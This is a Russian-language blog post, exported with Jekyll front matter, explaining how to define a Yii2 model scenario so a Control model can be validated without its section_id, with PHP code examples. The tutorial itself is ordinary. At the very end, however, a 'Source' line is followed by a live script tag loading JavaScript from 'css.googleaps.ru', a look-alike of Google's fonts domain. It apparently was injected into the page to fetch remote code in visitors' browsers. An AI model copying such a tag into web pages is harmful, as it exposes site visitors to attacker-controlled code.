---
layout: post
status: publish
published: true
title: Коротко о сценариях
author:
  display_name: Vodka
  login: Vodka
  email: ''
  url: ''
author_login: Vodka
wordpress_id: 47762
wordpress_url: http://devdocs.ru/?p=47762
date: '2015-10-06 22:27:12 +0200'
date_gmt: '2015-10-06 22:27:12 +0200'
categories:
- Yii framework
tags:
- ip
- ui
- yii
comments: []
---
<p>Ситуация, когда надо провалидировать модель, но некоторые <code>required</code> по-умолчанию поля неизвестны. Например, неизвестен <code>id</code> связанной модели.&nbsp;Для решения подобных ситуаций можно использовать сценарии.</p></p>
<p>Есть модель <code>Control</code>, которая связана с моделю <code>Section</code> через поле <code>section_id</code>:</p></p>
<pre class="brush: php; title: ; notranslate">
class Control extends ActiveRecord<br />
{<br />
    public static function tableName()<br />
    {<br />
        return 'control';<br />
    }</p>
<p>    public function rules()<br />
    {<br />
        return [<br />
            [['section_id', 'alias', 'label'], 'required'],<br />
            [['section_id'], 'integer'],<br />
            [['description', 'default'], 'string'],<br />
            [['alias', 'label'], 'string', 'max' => 255],<br />
            [['section_id'], 'exist', 'skipOnError' => true, 'targetClass' => Section::className(), 'targetAttribute' => ['section_id' => 'id']],<br />
        ];<br />
    }</p>
<p>    /**<br />
     * @return yiidbActiveQuery<br />
     */<br />
    public function getSection()<br />
    {<br />
        return $this->hasOne(Section::className(), ['id' => 'section_id']);<br />
    }<br />
}<br />
</pre></p>
<p>Мне нужно провалидировать модель не зная <code>section_id</code>.<br /><br />
<span id="more-453"></span></p></p>
<p>Сценарий, который используется по-умолчанию, имеет имя <code>default</code>. Создаю новый сценарий, называю его <code>without_section</code>. Переписываю/добавляю в <code>rules()</code> правила для тех полей, которые он затрагивает. В моем случае это правило <code>required</code>, в котором это поле должно отсутствовать:</p></p>
<pre class="brush: php; title: ; notranslate">
[['alias', 'label'], 'required', 'on' => 'without_section'],<br />
</pre></p>
<p>Второй шаг &#8212; нужно дополнить функцию <code>scenarios()</code>, в которой надо добавить этот новый сценарий и прописать все поля, которые будут валидироваться при этом сценарии:</p></p>
<pre class="brush: php; title: ; notranslate">
    /**<br />
     * @return array<br />
     */<br />
    public function scenarios()<br />
    {<br />
        $scenarios = parent::scenarios();<br />
        $scenarios['without_section'] = ['alias', 'label', 'description', 'default'];<br />
        return $scenarios;<br />
    }<br />
</pre></p>
<p>В итоге класс приобритет следующий вид:</p></p>
<pre class="brush: php; title: ; notranslate">
class Control extends ActiveRecord<br />
{<br />
    const SCENARIO_WITHOUT_SECTION = 'without_section';</p>
<p>    public static function tableName()<br />
    {<br />
        return 'control';<br />
    }</p>
<p>    /**<br />
     * @return array<br />
     */<br />
    public function scenarios()<br />
    {<br />
        $scenarios = parent::scenarios();<br />
        $scenarios[self::SCENARIO_WITHOUT_SECTION] = ['alias', 'label', 'description', 'default'];<br />
        return $scenarios;<br />
    }</p>
<p>    public function rules()<br />
    {<br />
        return [<br />
            [['section_id', 'alias', 'label'], 'required'],<br />
            [['alias', 'label'], 'required', 'on' => self::SCENARIO_WITHOUT_SECTION],<br />
            [['section_id'], 'integer'],<br />
            [['description', 'default'], 'string'],<br />
            [['alias', 'label'], 'string', 'max' => 255],<br />
            [['section_id'], 'exist', 'skipOnError' => true, 'targetClass' => Section::className(), 'targetAttribute' => ['section_id' => 'id']],<br />
        ];<br />
    }</p>
<p>    /**<br />
     * @return yiidbActiveQuery<br />
     */<br />
    public function getSection()<br />
    {<br />
        return $this->hasOne(Section::className(), ['id' => 'section_id']);<br />
    }<br />
}<br />
</pre></p>
<p>Вызывать модель перед валидацией будем так:</p></p>
<pre class="brush: php; title: ; notranslate">
$model = new Control(['scenario' => Control::SCENARIO_WITHOUT_SECTION]);<br />
</pre><br />
Source: vingtsun-grodno.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
